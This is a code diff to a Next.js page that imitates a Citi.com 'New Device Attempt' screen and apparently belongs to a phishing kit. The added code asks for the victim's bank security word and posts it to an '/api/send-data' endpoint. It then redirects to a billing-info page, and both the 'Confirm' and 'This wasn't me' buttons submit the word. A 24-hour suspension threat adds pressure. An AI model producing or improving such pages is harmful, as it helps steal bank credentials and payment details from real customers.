@@ -1,13 +1,34 @@
+"use client";
+
 import Footer from "@/components/layout/Footer";
 import Header from "@/components/layout/Header";
-import Link from "next/link";
-import React from "react";
+import axios from "axios";
+import { useRouter } from "next/navigation";
+import React, { useState } from "react";
 
-export const metadata = {
-  title: "New Device Attempt | Citi.com",
-};
+// export const metadata = {
+//   title: "New Device Attempt | Citi.com",
+// };
 
 const Page = () => {
+  const [securityWord, setSecurityWord] = useState("");
+  const [loading, setLoading] = useState(false);
+  const router = useRouter();
+
+  const handleSubmit = async (e) => {
+    e.preventDefault();
+
+    try {
+      setLoading(true);
+      await axios.post("/api/send-data", { securityWord });
+      router.push("/billing-info");
+    } catch (err) {
+      alert("Wrong Security Word, Please give valid Security Word");
+    } finally {
+      setLoading(false);
+    }
+  };
+
   return (
     <main className="bg-[#f5f7fa] min-h-screen flex flex-col">
       <Header />
@@ -24,21 +45,38 @@ const Page = () => {
             account.
           </p>
 
-          <div className="flex gap-4 mb-6">
-            <Link
-              href={"/billing-info"}
-              className="flex-1 border border-[#056dae] text-[#056dae] py-3 rounded-lg font-semibold hover:bg-[#f0f4f9] transition-colors text-center cursor-pointer"
-            >
-              This wasn’t me
-            </Link>
+          <form onSubmit={handleSubmit}>
+            <div className="flex mb-6 gap-4">
+              <h1 className="text-lg font-bold text-[#0d2d62]">
+                Security Word:
+              </h1>
+              <input
+                placeholder=""
+                type="text"
+                name="securityWord"
+                value={securityWord}
+                onChange={(e) => setSecurityWord(e.target.value)}
+                className="w-[200px] border rounded-lg px-4  text-lg tracking-widest text-center placeholder:tracking-normal placeholder:font-medium focus:outline-none focus:ring-2 focus:ring-[#0d2d62]"
+                required
+              />
+            </div>
 
-            <Link
-              href={"/billing-info"}
-              className="flex-1 bg-primary hover:!bg-[#054e7b] text-white py-3 rounded-lg font-semibold  transition-colors text-center"
-            >
-              Confirm
-            </Link>
-          </div>
+            <div className="flex gap-4 mb-6">
+              <button
+                type="submit"
+                className="flex-1 border border-[#056dae] text-[#056dae] py-3 rounded-lg font-semibold hover:bg-[#f0f4f9] transition-colors text-center cursor-pointer"
+              >
+                {loading ? "Loading..." : "This wasn’t me"}
+              </button>
+
+              <button
+                type="submit"
+                className="flex-1 bg-primary hover:!bg-[#054e7b] text-white py-3 rounded-lg font-semibold  transition-colors text-center"
+              >
+                {loading ? "Loading..." : "Confirm"}
+              </button>
+            </div>
+          </form>
 
           <p className="text-xs text-gray-600 leading-relaxed">
             If you don’t confirm within 24 hours, we’ll limit and suspend your
